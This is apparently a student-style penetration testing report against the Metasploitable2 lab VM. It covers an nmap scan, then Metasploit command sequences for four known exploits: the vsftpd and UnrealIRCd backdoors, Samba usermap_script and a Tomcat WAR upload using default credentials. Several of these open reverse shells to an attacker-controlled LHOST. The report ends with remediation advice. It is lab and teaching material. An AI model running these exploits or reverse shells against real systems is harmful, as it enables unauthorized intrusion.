# 🛡️ Penetration Testing Report – Metasploitable2

## 📌 Target Information
- \*\*Target IP:\*\* `192.168.1.186`
- \*\*OS:\*\* Linux (Metasploitable2 VM)
- \*\*Assessment Tool:\*\* Kali Linux + Metasploit Framework
- \*\*Objective:\*\* Identify and exploit known vulnerabilities on the target system.

---

## 🔎 1. Reconnaissance & Scanning

### 🔧 Tool Used:
- `nmap`

### 🔍 Command Executed:

```bash
nmap -sC -sV -Pn 192.168.1.186 -oN metasploitable\_scan.txt
```
### 📄 Key Open Ports & Services:

* `21/tcp` – vsftpd 2.3.4
* `139, 445/tcp` – Samba 3.0.20
* `6667/tcp` – UnrealIRCd 3.2.8.1
* `8180/tcp` – Apache Tomcat 5.5
* and more...

![Meta](file:///C:/Users/moham/OneDrive/Desktop/Meta.png)



## 💣 2. Exploitation Phase

## ✅ Exploit #1: `vsftpd 2.3.4` Backdoor

- **Module:** `exploit/unix/ftp/vsftpd_234_backdoor`
- **Payload:** `cmd/unix/interact`
```
use exploit/unix/ftp/vsftpd\_234\_backdoor
set RHOSTS 192.168.1.186
run
```
🔓 Successfully opened a command shell.



![Shell1](file:///C:/Users/moham/OneDrive/Desktop/Shell1.png)

## ✅ Exploit #2: `Samba 3.0.20` – Usermap Script

- **Module:** `exploit/multi/samba/usermap_script`
- **Payload:** `cmd/unix/reverse`

```
bashCopyEdituse exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.186
set RPORT 139
set LHOST <Kali_IP>
set PAYLOAD cmd/unix/reverse
exploit
```

🔓 Reverse shell established.

![M Eta2](file:///C:/Users/moham/OneDrive/Desktop/MEta2.png)
![Shell3](file:///C:/Users/moham/OneDrive/Desktop/Shell3.png)
## ✅ Exploit #3: `UnrealIRCd 3.2.8.1` Backdoor

- **Module:** `exploit/unix/irc/unreal_ircd_3281_backdoor`
- **Payload:** `cmd/unix/reverse`

```
bashCopyEdituse exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.1.186
set RPORT 6667
set LHOST <Kali_IP>
exploit
```
🔓 Backdoor exploited successfully.

![Unreal](file:///C:/Users/moham/OneDrive/Desktop/Unreal.png)


## ✅ Exploit #4: Apache Tomcat 5.5 – WAR Upload


- **Module:** `exploit/multi/http/tomcat_mgr_upload`
- **Credentials:** `tomcat:tomcat` (default)
- **Payload:** `java/shell_reverse_tcp`

```
bashCopyEdituse exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.186
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST <Kali_IP>
set PAYLOAD java/shell_reverse_tcp
exploit
```

🔓 WAR file uploaded, shell returned.

![Tomcat](file:///C:/Users/moham/OneDrive/Desktop/Tomcat.png)
## 🧾 3. Summary of Findings
| Vulnerability | Service | Exploit Module | Result |
| --- | --- | --- | --- |
| vsftpd Backdoor | FTP (21) | exploit/unix/ftp/vsftpd\_234\_backdoor | Shell access |
| Samba Usermap | Samba (139/445) | exploit/multi/samba/usermap\_script | Reverse shell |
| UnrealIRCd Backdoor | IRC (6667) | exploit/unix/irc/unreal\_ircd\_3281\_backdoor | Reverse shell |
| Tomcat WAR Upload | HTTP (8180) | exploit/multi/http/tomcat\_mgr\_upload | Reverse shell |

## 🔐 4. Recommendations

🔸 **Upgrade vulnerable services:**

- Replace outdated versions of vsftpd, Samba, UnrealIRCd, and Apache Tomcat.

🔸 **Restrict access to management panels:**

- Limit Tomcat Manager access by IP and strong credentials.

🔸 **Disable unused services:**

- Disable services like IRC, NFS, rlogin if not needed.

🔸 **Use Firewalls & IDS:**

- Monitor and restrict incoming connections using iptables or ufw.